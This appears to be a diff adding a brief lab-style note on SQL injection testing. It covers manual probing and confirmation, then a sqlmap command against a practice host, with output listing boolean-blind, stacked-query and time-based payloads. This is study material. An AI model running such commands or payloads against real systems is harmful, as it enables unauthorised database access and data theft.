@@ -1,3 +1,38 @@
+The process of identifying and exploiting SQL injection vulnerabilities typically involves the following steps:
+
+1. **Manual Testing** – Initially, I manually test the input fields by experimenting with different payloads to observe how the application responds. This helps in identifying potential vulnerabilities.
+    
+2. **Confirming the Vulnerability** – If unexpected behavior or errors indicate an SQL injection flaw(eg: blind or error based SQLi ), I further analyze the responses to confirm its presence.
+    
+3. **Automating with SQLMap** – Once the vulnerability is confirmed, I use SQLMap to automate the exploitation process, allowing me to extract information quickly and efficiently.
+    
+
+This approach ensures a thorough assessment before leveraging automated tools for faster results.
+
+
+Eg --->
+==Using SQL map== for the identified vulnerable Query parameter :-
+-  sqlmap -u http://sqli2.naham.sec:8081/article-count?date=may%202020 --dbs --batch
+
+```
+Output:-
+
+sqlmap identified the following injection point(s) with a total of 322 HTTP(s) requests:
+---
+Parameter: date (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: date=may 2020' AND 7616=7616 AND 'RTbN'='RTbN
+
+    Type: stacked queries
+    Title: MySQL >= 5.0.12 stacked queries (comment)
+    Payload: date=may 2020';SELECT SLEEP(5)#
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: date=may 2020' AND (SELECT 7952 FROM (SELECT(SLEEP(5)))vtRl) AND 'xPpz'='xPpz
+
+```
 
 
 
